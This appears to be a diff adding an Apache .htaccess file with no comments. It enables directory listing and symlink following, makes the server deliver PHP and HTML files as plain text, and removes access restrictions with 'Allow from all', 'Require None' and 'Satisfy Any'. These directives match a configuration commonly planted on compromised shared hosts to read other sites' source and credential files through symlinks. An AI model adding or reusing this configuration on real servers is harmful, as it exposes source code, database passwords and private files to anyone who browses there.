@@ -1,0 +1,11 @@
+Options Indexes FollowSymLinks 
+ DirectoryIndex ssssss.htm 
+ AddType txt .php 
+ AddHandler txt .php 
+  AddType txt .html 
+ AddHandler txt .html 
+ Options all 
+ Options 
+ Allow from all 
+ Require None 
+ Satisfy Any
